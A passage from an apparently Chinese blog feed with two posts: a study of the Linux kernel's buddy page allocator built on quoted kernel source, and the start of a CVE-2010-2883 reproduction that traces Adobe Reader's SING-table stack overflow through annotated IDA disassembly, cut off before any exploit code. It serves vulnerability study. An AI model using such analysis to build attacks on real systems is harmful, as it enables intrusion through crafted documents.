src="http://imgsrc.baidu.com/forum/pic/item/11385343fbf2b211dbb767878f8065380dd78e5a.jpg"></p><p>其中核心的函数就是<code>__alloc_pages_nodemask</code>,这里我们需要先知道<code>gfp_mask</code>和<code>alloc_flags</code>这两个标志</p><p><strong>gfp_flags</strong></p><ol><li>__GFP_DMA：请求在ZONE_DMA区域中分配页面；</li><li>__GFP_HIGHMEM：请求在ZONE_HIGHMEM区域中分配页面；</li><li>__GFP_MOVABLE：ZONE_MOVALBE可用时在该区域分配页面，同时表示页面分配后可以在内存压缩时进行迁移，也能进行回收；</li><li>__GFP_RECLAIMABLE：请求分配到可恢复页面；</li><li>__GFP_HIGH：高优先级处理请求；</li><li>__GFP_IO：请求在分配期间进行 I&#x2F;O 操作；</li><li>__GFP_FS：请求在分配期间进行文件系统调用；</li><li>__GFP_ZERO：请求将分配的区域初始化为 0；</li><li>__GFP_NOFAIL：不允许请求失败，会无限重试；</li><li>__GFP_NORETRY：请求不重试内存分配请求；<br>这里我是直接引用的cft56200_ln师傅的图<br><img src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304ebfdb423394c8a786c8175c7a.jpg"></li></ol><p><strong>alloc_flags</strong></p><ol><li>ALLOC_WMARK_MIN：仅在最小水位water mark及以上限制页面分配；</li><li>ALLOC_WMARK_LOW：仅在低水位water mark及以上限制页面分配；</li><li>ALLOC_WMARK_HIGH：仅在高水位water mark及以上限制页面分配；</li><li>ALLOC_HARDER：努力分配，一般在gfp_mask设置了__GFP_ATOMIC时会使用；</li><li>ALLOC_HIGH：高优先级分配，一般在gfp_mask设置了__GFP_HIGH时使用；</li><li>ALLOC_CPUSET：检查是否为正确的 cpuset；</li><li>ALLOC_CMA：允许从 CMA 区域进行分配</li></ol><p>下面就是该核心函数的函数体部分，他位于<code>/mm/page_alloc.c</code>当中，如下：</p><pre><code class="hljs">/* * This is the &#39;heart&#39; of the zoned buddy allocator.（看好了，兄弟系统是这么用的） */struct page *__alloc_pages_nodemask(gfp_t gfp_mask, unsigned int order, int preferred_nid,                            nodemask_t *nodemask)&#123;    struct page *page;    unsigned int alloc_flags = ALLOC_WMARK_LOW;    gfp_t alloc_mask; /* The gfp_t that was actually used for allocation */    struct alloc_context ac = &#123; &#125;;    /*     * There are several places where we assume that the order value is sane     * so bail out early if the request is out of bound.     */    if (unlikely(order &gt;= MAX_ORDER)) &#123;        WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));        return NULL;    &#125;    gfp_mask &amp;= gfp_allowed_mask;    alloc_mask = gfp_mask;    if (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))        return NULL;    /*     * Forbid the first pass from falling back to types that fragment     * memory until all local zones are considered.     */    alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);    /* First allocation attempt */    page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);    if (likely(page))        goto out;    /*     * Apply scoped allocation constraints. This is mainly about GFP_NOFS     * resp. GFP_NOIO which has to be inherited for all allocation requests     * from a particular context which has been marked by     * memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;.     */    alloc_mask = current_gfp_context(gfp_mask);    ac.spread_dirty_pages = false;    /*     * Restore the original nodemask if it was potentially replaced with     * &amp;cpuset_current_mems_allowed to optimize the fast-path attempt.     */    ac.nodemask = nodemask;    page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);out:    if (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;        unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != 0)) &#123;        __free_pages(page, order);        page = NULL;    &#125;    trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);    return page;&#125;EXPORT_SYMBOL(__alloc_pages_nodemask);</code></pre><p>上面函数概括为下面的步骤：</p><ol><li>检测环境，准备分配</li><li>快速分配，调用<code>get_page_from_freelist()</code></li><li>慢速分配，调用<code>__alloc_pages_slowpath()</code></li><li>快慢均失败，考虑页面回收，杀死进程后再次尝试</li></ol><p>其中准备函数<code>prepare_alloc_pages()</code>是设定一下环境值且从指定参数<code>node</code>中获取一个<code>zonelist</code>，这里就不多讲了，直接来讲解快速分配函数<code>get_page_from_freelist()</code>,他位于<code>/mm/page_alloc.c</code></p><pre><code class="hljs">static struct page *get_page_from_freelist(gfp_t gfp_mask, unsigned int order, int alloc_flags,                        const struct alloc_context *ac)&#123;    struct zoneref *z;    struct zone *zone;    struct pglist_data *last_pgdat_dirty_limit = NULL;    bool no_fallback;retry:    /*     * 扫描 zonelist, 寻找有着足够空闲块的zone     * See also __cpuset_node_allowed() comment in kernel/cpuset.c.     */    no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT;    z = ac-&gt;preferred_zoneref;    for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,                    ac-&gt;nodemask) &#123;        struct page *page;        unsigned long mark;        if (cpusets_enabled() &amp;&amp;            (alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;            !__cpuset_zone_allowed(zone, gfp_mask))                continue;        /*         * When allocating a page cache page for writing, we         * want to get it from a node that is within its dirty         * limit, such that no single node holds more than its         * proportional share of globally allowed dirty pages.         * The dirty limits take into account the node&#39;s         * lowmem reserves and high watermark so that kswapd         * should be able to balance it without having to         * write pages from its LRU list.         *         * XXX: For now, allow allocations to potentially         * exceed the per-node dirty limit in the slowpath         * (spread_dirty_pages unset) before going into reclaim,         * which is important when on a NUMA setup the allowed         * nodes are together not big enough to reach the         * global limit.  The proper fix for these situations         * will require awareness of nodes in the         * dirty-throttling and the flusher threads.         */        if (ac-&gt;spread_dirty_pages) &#123;            if (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)                continue;            if (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;                last_pgdat_dirty_limit = zone-&gt;zone_pgdat;                continue;            &#125;        &#125;        if (no_fallback &amp;&amp; nr_online_nodes &gt; 1 &amp;&amp;            zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;            int local_nid;            /*             * If moving to a remote node, retry but allow             * fragmenting fallbacks. Locality is more important             * than fragmentation avoidance.             */            local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);            if (zone_to_nid(zone) != local_nid) &#123;                alloc_flags &amp;= ~ALLOC_NOFRAGMENT;                goto retry;            &#125;        &#125;        mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);        if (!zone_watermark_fast(zone, order, mark,                       ac-&gt;highest_zoneidx, alloc_flags,                       gfp_mask)) &#123;            int ret;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT            /*             * Watermark failed for this zone, but see if we can             * grow this zone if it contains deferred pages.             */            if (static_branch_unlikely(&amp;deferred_pages)) &#123;                if (_deferred_grow_zone(zone, order))                    goto try_this_zone;            &#125;#endif            /* Checked here to keep the fast path fast */            BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);            if (alloc_flags &amp; ALLOC_NO_WATERMARKS)                goto try_this_zone;            if (node_reclaim_mode == 0 ||                !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))                continue;            ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);            switch (ret) &#123;            case NODE_RECLAIM_NOSCAN:                /* did not scan */                continue;            case NODE_RECLAIM_FULL:                /* scanned but unreclaimable */                continue;            default:                /* did we reclaim enough */                if (zone_watermark_ok(zone, order, mark,                    ac-&gt;highest_zoneidx, alloc_flags))                    goto try_this_zone;                continue;            &#125;        &#125;try_this_zone:   //本zone正常水位        page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,                gfp_mask, alloc_flags, ac-&gt;migratetype);        if (page) &#123;            prep_new_page(page, order, gfp_mask, alloc_flags);            /*             * If this is a high-order atomic allocation then check             * if the pageblock should be reserved for the future             */            if (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))                reserve_highatomic_pageblock(page, zone, order);            return page;        &#125; else &#123;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT            /* Try again if zone has deferred pages */            if (static_branch_unlikely(&amp;deferred_pages)) &#123;                if (_deferred_grow_zone(zone, order))                    goto try_this_zone;            &#125;#endif        &#125;    &#125;    /*     * It&#39;s possible on a UMA machine to get through all zones that are     * fragmented. If avoiding fragmentation, reset and try again.     */    if (no_fallback) &#123;        alloc_flags &amp;= ~ALLOC_NOFRAGMENT;        goto retry;    &#125;    return NULL;&#125;</code></pre><p>其功能就是首先遍历当前的<code>zone</code>，判断当前<code>zone</code>是否满足low water mark水位，若不满足则进行一次快速回收操作，再次检测水位情况，若还是不能满足，则遍历下一个<code>zone</code>，然后采取同样的步骤，最后进入<code>rmqueue</code>函数，这就是<code>buddy system</code>的核心，过程可以简化看下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/11385343fbf2b211d43468878f8065380dd78ee5.jpg"></p><p>相比于代码，下图更加直观，之后我们来查看关键函数<code>rmqueue()</code>,它位于<code>/mm/page_alloc.c</code></p><pre><code class="hljs">/* * 从所给zone中获取页. 当order为0的时候，使用pcplists. */static inlinestruct page *rmqueue(struct zone *preferred_zone,            struct zone *zone, unsigned int order,            gfp_t gfp_flags, unsigned int alloc_flags,            int migratetype)&#123;    unsigned long flags;    struct page *page;    if (likely(order == 0)) &#123;        /*          * 若没有开启`CMA`|设置`ALLOC_CMA`|迁移类型为MIGRATE_MOVABLE，则先从pcplist上分配         */        if (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||                migratetype != MIGRATE_MOVABLE) &#123;            page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,                    migratetype, alloc_flags);            goto out;        &#125;    &#125;    /*     * We most definitely don&#39;t want callers attempting to     * allocate greater than order-1 page units with __GFP_NOFAIL.     */    WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; 1));    spin_lock_irqsave(&amp;zone-&gt;lock, flags);    do &#123;        page = NULL;        /*         * order-0 request can reach here when the pcplist is skipped         * due to non-CMA allocation context. HIGHATOMIC area is         * reserved for high-order atomic allocation, so order-0         * request should skip it.         */        if (order &gt; 0 &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123; //order大于0且带有ALLOC_HARDER，使用__rmqueue_smallest分配            page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);            if (page)                trace_mm_page_alloc_zone_locked(page, order, migratetype);        &#125;        /*         * 执行到这里说明order&gt;0,我们采用__rmqueue函数，这是真正的兄弟系统核心分配函数         */        if (!page)            page = __rmqueue(zone, order, migratetype, alloc_flags);    &#125; while (page &amp;&amp; check_new_pages(page, order));    spin_unlock(&amp;zone-&gt;lock);    if (!page)        goto failed;    __mod_zone_freepage_state(zone, -(1 &lt;&lt; order),                  get_pcppage_migratetype(page));    __count_zid_vm_events(PGALLOC, page_zonenum(page), 1 &lt;&lt; order);    zone_statistics(preferred_zone, zone);    local_irq_restore(flags);out:    /* Separate test+clear to avoid unnecessary atomics */    if (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;        clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);        wakeup_kswapd(zone, 0, 0, zone_idx(zone));    &#125;    VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);    return page;failed:    local_irq_restore(flags);    return NULL;&#125;</code></pre><p>有部分注释，我在上面中西合璧标注了一下，接下来先提醒大家伙，之前咱们讲解<code>zone</code>上的一个字段<code>per-cpu pageset</code>,他是为了放置条件竞争的问题，为每个cpu单独设置一个仓库用来为<code>buddy system</code>进行迅速的分配，这里就是给出了<code>buddy system</code>先从他里面调用的函数代码，总结为一下流程</p><ol><li>若<code>order</code>为0，若没有开启<code>CMA</code>|设置<code>ALLOC_CMA</code>|迁移类型为MIGRATE_MOVABLE，则先从per-cpu pageset 中分配并且返回</li><li>order &gt;0 调用<code>__rmqueue_smallest()</code>分配</li><li>若未分配成功，这里不管order是否为0，调用<code>__rmqueue()</code>分配</li><li>结果检查，调用<code>check_new_pages()</code>，未通过则循环跳到第二步</li></ol><p>我们一个一个关键函数来查看，首先是分配<code>per_cpu_pageset</code>,也就是如下函数</p><p><strong>rmqueue_pcplist()</strong></p><pre><code class="hljs">/* Lock and remove page from the per-cpu list */static struct page *rmqueue_pcplist(struct zone *preferred_zone,            struct zone *zone, gfp_t gfp_flags,            int migratetype, unsigned int alloc_flags)&#123;    struct per_cpu_pages *pcp;    struct list_head *list;    struct page *page;    unsigned long flags;    local_irq_save(flags); // 关中断    pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;    list = &amp;pcp-&gt;lists[migratetype]; // 获取迁移类型链表    page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, list); // 分配    if (page) &#123;        __count_zid_vm_events(PGALLOC, page_zonenum(page), 1);        zone_statistics(preferred_zone, zone);    &#125;    local_irq_restore(flags); // 开中断    return page;&#125;</code></pre><p>主要是进行了一些同步互斥操作（开关中断），然后调用函数<code>__rmqueue_pcplist</code></p><pre><code class="hljs">/* 从 per-cpu 链表上取出 page, 调用者必须保护链表 */static struct page *__rmqueue_pcplist(struct zone *zone, int migratetype,            unsigned int alloc_flags,            struct per_cpu_pages *pcp,            struct list_head *list)&#123;    struct page *page;    do &#123;        if (list_empty(list)) &#123; // list 是空的            //             pcp-&gt;count += rmqueue_bulk(zone, 0,                    READ_ONCE(pcp-&gt;batch), list,                    migratetype, alloc_flags);            if (unlikely(list_empty(list)))                return NULL;        &#125;        // 链表脱链        page = list_first_entry(list, struct page, lru);        list_del(&amp;page-&gt;lru);        pcp-&gt;count--;    &#125; while (check_new_pcp(page));    return page;&#125;</code></pre><p>这里先判定链表，若为空，则调用<code>rmqueue_bulk()</code>函数，从<code>zone</code>上拿到pages之后再进行<code>unlink</code>，而<code>rmqueue_bulk()</code>函数最终会调用<code>__rmqueue()</code></p><pre><code class="hljs">/* * 为了高效率，从 buddy 分配器获得指定数量的元素,  * 所有的单个元素都在持有锁的情况下进行.  将其添加到提供的链表中. * 返回放置在 *list 链表上的 pages 数量. */static int rmqueue_bulk(struct zone *zone, unsigned int order,            unsigned long count, struct list_head *list,            int migratetype, unsigned int alloc_flags)&#123;    int i, alloced = 0;    spin_lock(&amp;zone-&gt;lock);    for (i = 0; i &lt; count; ++i) &#123;        struct page *page = __rmqueue(zone, order, migratetype,                                alloc_flags);        if (unlikely(page == NULL))            break;        if (unlikely(check_pcp_refill(page)))            continue;        /*         * 由 expand() 返回的分割 buddy 页面在此处以物理页框顺序接收。         * 页面被添加到 caller 的链表尾部。从 caller 的角度看，链表在         * 某些情况下是按照页码排序的。这对一些可以从头部前向的IO设备是有用的，         * 因为链表也是在物理页的顺序上的。这对于可以在物理页合理排序的情况下         * 合并IO请求的IO设备是有用的。         */        list_add_tail(&amp;page-&gt;lru, list);        alloced++;        if (is_migrate_cma(get_pcppage_migratetype(page)))            __mod_zone_page_state(zone, NR_FREE_CMA_PAGES,                          -(1 &lt;&lt; order));    &#125;    /*     * i pages were removed from the buddy list even if some leak due     * to check_pcp_refill failing so adjust NR_FREE_PAGES based     * on i. Do not confuse with &#39;alloced&#39; which is the number of     * pages added to the pcp list.     */    __mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));    spin_unlock(&amp;zone-&gt;lock);    return alloced;&#125;</code></pre><p><strong>__rmqueue_smallest</strong><br>该函数就是由order对应的<code>free_area</code>中类型为<code>migration type</code>的链表上进行分配，如果不够则向高order处请求，由于这里都是以2^order来进行分配，因此如果说我order为1，且这里不够的话，我们就转而order为2的链表，将其中的块对半拆下到低order中，其中向更高order分配是通过循环和脱链完成，而拆高阶的page是通过<code>expand()</code>函数来进行的</p><pre><code class="hljs">/* * 对给定的 migrationtype 遍历 free lists  * 并从 freelists 上移除最小可用的页面 */static __always_inlinestruct page *__rmqueue_smallest(struct zone *zone, unsigned int order,                        int migratetype)&#123;    unsigned int current_order;    struct free_area *area;    struct page *page;    /* 在 preferred list 上寻找一个合适 size 的 page */    for (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;        area = &amp;(zone-&gt;free_area[current_order]);        page = get_page_from_free_area(area, migratetype);        if (!page)            continue;        del_page_from_free_list(page, zone, current_order);        expand(zone, page, order, current_order, migratetype);        set_pcppage_migratetype(page, migratetype);        return page;    &#125;    return NULL;&#125;</code></pre><p>而拆分函数<code>expand</code>也比较简单</p><pre><code class="hljs">/* * 此处再分割的顺序对 IO subsystem 而言是十分重要的. * 请不要在有好的理由及回归测试前改变这个顺序。 * 特别地，当大块的内存被分割，更小块（内存）被传递的顺序 * 则由他们在该函数中被分割的顺序决定。 * 根据实际测试，这是影响传递给IO子系统的 pages 顺序的主要因素， * 考虑到包含一个内存大块（由一系列小的分配作用）的 buddy system 的行为， * 这也是合理的。这种行为是 sglist 合并成功的关键因素。 * * -- nyc */static inline void expand(struct zone *zone, struct page *page,    int low, int high, int migratetype)&#123;    unsigned long size = 1 &lt;&lt; high;    while (high &gt; low) &#123;        high--;        size &gt;&gt;= 1;        VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);        /*         * 标记为 guard pages (或 page), 这将允许在 buddy 将被         * 释放时合并回分配器.对应的页表项不会被创建，         * pages 在 虚拟地址空间上仍将保持不存在。         */        if (set_page_guard(zone, &amp;page[size], high, migratetype))            continue;        add_to_free_list(&amp;page[size], zone, high, migratetype);        set_buddy_order(&amp;page[size], high);    &#125;&#125;</code></pre><p><strong>__rmqueue()</strong></p><p>最开始我以为这个才是最终函数，但其实他不是，他反而还会调用<code>__rmqueue_smallest()</code></p><pre><code class="hljs">/* * 从 buddy allocator 上移除一个元素. * 在持有 zone-&gt;lock 时调用. */static __always_inline struct page *__rmqueue(struct zone *zone, unsigned int order, int migratetype,                        unsigned int alloc_flags)&#123;    struct page *page;    if (IS_ENABLED(CONFIG_CMA)) &#123;        /*         * 通过当半数空闲内存在 CMA 区域时从 CMA 中分配         * 以平衡常规的与CMA区域的可迁移的分配。         */        if (alloc_flags &amp; ALLOC_CMA &amp;&amp;            zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;            zone_page_state(zone, NR_FREE_PAGES) / 2) &#123;            page = __rmqueue_cma_fallback(zone, order);            if (page)                goto out;        &#125;    &#125;retry:    page = __rmqueue_smallest(zone, order, migratetype);    if (unlikely(!page)) &#123;        if (alloc_flags &amp; ALLOC_CMA)            page = __rmqueue_cma_fallback(zone, order);        if (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,                                alloc_flags))            goto retry;    &#125;out:    if (page)        trace_mm_page_alloc_zone_locked(page, order, migratetype);    return page;&#125;</code></pre><p>整体快速分配可以看下面这张图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/a6efce1b9d16fdfadde22b27f18f8c5495ee7b69.jpg"></p><p>我们了解完了快速分配，接下来就是慢速分配了，其中他的功能包括了内存碎片化的整理和回收，他的代码太长，我就也只贴一部分，如下：</p><pre><code class="hljs">static inline struct page *__alloc_pages_slowpath(gfp_t gfp_mask, unsigned int order,      struct alloc_context *ac)&#123;  page = __alloc_pages_direct_compact(gfp_mask, order,       alloc_flags, ac,      INIT_COMPACT_PRIORITY,      &amp;compact_result);  ......  page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,        &amp;did_some_progress);  ......&#125;</code></pre><p>其中内存碎片化也即是利用到迁移的知识，这里有两个关键函数，其中之一就是<code>__alloc_pages_direct_compact</code></p><pre><code class="hljs">static struct page *__alloc_pages_direct_compact(gfp_t gfp_mask, unsigned int order,  unsigned int alloc_flags, const struct alloc_context *ac,  enum compact_priority prio, enum compact_result *compact_result)&#123; struct page *page; unsigned int noreclaim_flag;  if (!order)  return NULL;  noreclaim_flag = memalloc_noreclaim_save(); *compact_result = try_to_compact_pages(gfp_mask, order, alloc_flags, ac,         prio); memalloc_noreclaim_restore(noreclaim_flag);  if (*compact_result &lt;= COMPACT_INACTIVE)  return NULL;  count_vm_event(COMPACTSTALL);  page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);  if (page) &#123;  struct zone *zone = page_zone(page);   zone-&gt;compact_blockskip_flush = false;  compaction_defer_reset(zone, order, true);  count_vm_event(COMPACTSUCCESS);  return page; &#125;  count_vm_event(COMPACTFAIL);  cond_resched();  return NULL;&#125;</code></pre><p>这里的函数也是迁移算法<code>memory compaction</code>的代码实现，该算法可以简化为下面的流程</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/242dd42a2834349b34c1834c8cea15ce37d3be30.jpg"></p><p>也就是分为两个链表，一个专门遍历空闲页，一个专门遍历使用页，注意这俩要分别维持链表，然后最后进行交换操作就实现了迁移过程，且记住这个迁移是需要<code>page</code>本身是允许的才行,</p><p>在完成上述迁移操作后会再次尝试快速分配，这里的碎片化整理还有其他方式，但是我这里暂不区深究，先记录个图等我哪天想起来了再探索</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/e4dde71190ef76c6cae717e2d816fdfaae5167c6.jpg"></p><p>而关于慢速分配还有个函数是<code>__alloc_pages_direct_reclaim()</code>，他的作用主要是回收，而不是碎片整理</p><p>最后来个整体分配页框的函数流程图<br><img src="http://imgsrc.baidu.com/forum/pic/item/810a19d8bc3eb135a3e35b72e31ea8d3fc1f44d7.jpg"></p><h1 id="暂未完工"><a href="#暂未完工" class="headerlink" title="暂未完工"></a>暂未完工</h1><p>一天下来怎么硕呢，感觉都是几位师傅的博客一口一口的喂饭，虽说自己理解了大致过程，但是对于源码的解读还是太粗了，这个系列还有释放页框和slub算法的源码实现，slub算法我再上一篇博客中已经讲解了大致原理了哦，这里还差一部分，</p>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>kernel</tag>
      
      <tag>source</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2010-2883漏洞复现</title>
    <link href="/2023/06/17/CVE-2010-2883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/06/17/CVE-2010-2883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-2883漏洞复现"><a href="#CVE-2010-2883漏洞复现" class="headerlink" title="CVE-2010-2883漏洞复现"></a>CVE-2010-2883漏洞复现</h1><h2 id="1-所需环境"><a href="#1-所需环境" class="headerlink" title="1.所需环境"></a>1.所需环境</h2><ul><li>受害者所处操作系统：Windows XP SP3(MSDN版)</li><li>虚拟机：VMware workstation</li><li>动态调试：吾爱OllyDbg</li><li>静态调试：IDA pro</li><li>漏洞软件：Adobe Reader(版本号-9.3.4)</li></ul><h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h2><p>该漏洞是利用Adobe Reader 和 Acrobat中<code>CoolType.dll</code>库在解析字体文件SING表中存在的栈溢出漏洞，导致的结果就是当用户打开了特制的PDF文件后就可能导致任意代码执行</p><h2 id="3-基础知识们"><a href="#3-基础知识们" class="headerlink" title="3.基础知识们"></a>3.基础知识们</h2><p>本次漏洞是在PDF当中，因此我们需要线了解以下pdf文档的格式，以及其中关键点ttf sing表的格式，首先pdf的格式，下面是盗的图（</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5992036/v2yp86lax8.png?imageView2/2/w/2560/h/7000"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5992036/51k8v42nbp.jpeg?imageView2/2/w/2560/h/7000"></p><ul><li>Header :头部，用来注明版本号</li><li>Body：主体，图片、文字等</li><li>xref tale：交叉引用表，存放所有对象的偏移</li><li>Trailer：文件尾部，以%%EOF结尾</li></ul><p>而ttf文件就是pdf中的字体文件，而TTF中关于SING表的数据结构体TableEntry的结构如下：</p><pre><code class="hljs">typedef struct_SING&#123;    char tag[4]; //标记&quot;SING&quot;    ULONG checkSum;//校验和：0xD9BCC8B5    ULONG offset; //相对文件的偏移：0x0000011C    ULONG length;//数据长度：0x00001DDF&#125;TableEntry;</code></pre><p>而上面是一个定位SING表的引子，接下来是SING表的整体结构<br><img src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg"></p><p>具体数据结构如下：</p><pre><code class="hljs">#ifndef FORMAT_SING_H#define FORMAT_SING_H#define SING_VERSION VERSION(1, 1)#define SING_UNIQUENAMELEN 28#define SING_MD5LEN 16typedef struct&#123;Card16 tableVersionMajor;//Card16,两字节Card16 tableVersionMinor;Card16 glyphletVersion;Card16 permissions;Card16 mainGID;Card16 unitsPerEm;Int16 vertAdvance;Int16 vertOrigin;Card8 uniqueName[SING_UNIQUENAMELEN];Card8 METAMD5[SING_MD5LEN];Card8 nameLength;Card8 *baseGlyphName; /* name array */&#125; SINGTbl;</code></pre><h2 id="4-发现漏洞点"><a href="#4-发现漏洞点" class="headerlink" title="4.发现漏洞点"></a>4.发现漏洞点</h2><p>首先我们找到位于Adobe文件路径下的动态库<br><img src="http://imgsrc.baidu.com/forum/pic/item/32fa828ba61ea8d3a10a50ced20a304e241f58cb.jpg"><br>我们打开IDA，分析<code>CoolType.dll</code>库，查看字符串表<code>SING</code>，然后查看交叉引用，这里若是使用F12找的字符串可能会出问题，因此我们使用ALT + T 组合键来寻找<code>SING</code></p><pre><code class="hljs">text:0803DCF9                               ; __unwind &#123; // loc_8184A54.text:0803DCF9 55                            push    ebp.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4].text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie.text:0803DD09 33 C5                         xor     eax, ebp.text:0803DD0B 89 85 04 01 00 00             mov     [ebp+108h+var_4], eax.text:0803DD11 6A 4C                         push    4Ch.text:0803DD13 B8 54 4A 18 08                mov     eax, offset loc_8184A54.text:0803DD18 E8 B4 A4 00 00                call    __EH_prolog3_catch.text:0803DD18.text:0803DD1D 8B 85 1C 01 00 00             mov     eax, [ebp+108h+arg_C].text:0803DD23 8B BD 10 01 00 00             mov     edi, [ebp+108h+arg_0].text:0803DD29 8B 9D 14 01 00 00             mov     ebx, [ebp+108h+arg_4].text:0803DD2F 89 7D D8                      mov     [ebp+108h+var_130], edi.text:0803DD32 89 45 D0                      mov     [ebp+108h+var_138], eax.text:0803DD35 E8 F2 39 00 00                call    sub_804172C.text:0803DD35.text:0803DD3A 33 F6                         xor     esi, esi                        ; esi清0，之后用于判断值是否为空.text:0803DD3C 83 7F 08 03                   cmp     dword ptr [edi+8], 3.text:0803DD3C.text:0803DD40                               ;   try &#123;.text:0803DD40 89 75 FC                      mov     [ebp+108h+var_10C], esi.text:0803DD43 0F 84 B7 01 00 00             jz      loc_803DF00.text:0803DD43.text:0803DD49 89 75 E4                      mov     [ebp+108h+var_124], esi.text:0803DD4C 89 75 E8                      mov     [ebp+108h+var_120], esi.text:0803DD4F 83 7F 0C 01                   cmp     dword ptr [edi+0Ch], 1.text:0803DD4F                               ;   &#125; // starts at 803DD40.text:0803DD4F.text:0803DD53                               ;   try &#123;.text:0803DD53 C6 45 FC 01                   mov     byte ptr [ebp+108h+var_10C], 1.text:0803DD57 0F 85 4C 01 00 00             jnz     loc_803DEA9.text:0803DD57.text:0803DD5D 68 2C DB 19 08                push    offset aName                    ; &quot;name&quot;.text:0803DD62 57                            push    edi                             ; int.text:0803DD63 8D 4D E4                      lea     ecx, [ebp+108h+var_124].text:0803DD66 C6 45 EF 00                   mov     [ebp+108h+var_119], 0.text:0803DD6A E8 68 3A FE FF                call    sub_80217D7.text:0803DD6A.text:0803DD6F 39 75 E4                      cmp     [ebp+108h+var_124], esi.text:0803DD72 75 69                         jnz     short loc_803DDDD.text:0803DD72.text:0803DD74 68 4C DB 19 08                push    offset aSing                    ; &quot;SING&quot;.text:0803DD79 57                            push    edi                             ; int.text:0803DD7A 8D 4D DC                      lea     ecx, [ebp+108h+var_12C]         ; 指向SING表入口.text:0803DD7D E8 84 3D FE FF                call    sub_8021B06                     ; 处理SING表.text:0803DD7D.text:0803DD82 8B 45 DC                      mov     eax, [ebp+108h+var_12C]         ; SING表入口赋值给eax.text:0803DD85 3B C6                         cmp     eax, esi                        ; 判断表入口是否位空.text:0803DD85                               ;   &#125; // starts at 803DD53.text:0803DD85.text:0803DD87                               ;   try &#123;.text:0803DD87 C6 45 FC 02                   mov     byte ptr [ebp+108h+var_10C], 2.text:0803DD8B 74 37                         jz      short loc_803DDC4               ; 若我们处理的SING表不出差错，这里是不会进行跳转的.text:0803DD8B.text:0803DD8D 8B 08                         mov     ecx, [eax]                      ; 这里传入的是SING表的第一个四字节，这里是1.0版本，也就是00 01 00 00.text:0803DD8F 81 E1 FF FF 00 00             and     ecx, 0FFFFh                     ; 这里进行判断想与，会设置对应eflags标志位.text:0803DD95 74 08                         jz      short loc_803DD9F               ; 由于上一步设置了相应标志位，因此在这里跳转.text:0803DD95.text:0803DD97 81 F9 00 01 00 00             cmp     ecx, 100h.text:0803DD9D 75 21                         jnz     short loc_803DDC0.text:0803DD9D.text:0803DD9F.text:0803DD9F                               loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j.text:0803DD9F 83 C0 10                      add     eax, 10h                        ; eax本来是存放SING表首地址，这里加上0x10偏移指向uniqueName.text:0803DD9F                                                                       ; uniqueName域.text:0803DDA2 50                            push    eax                             ; Source.text:0803DDA3 8D 45 00                      lea     eax, [ebp+108h+Destination]     ; 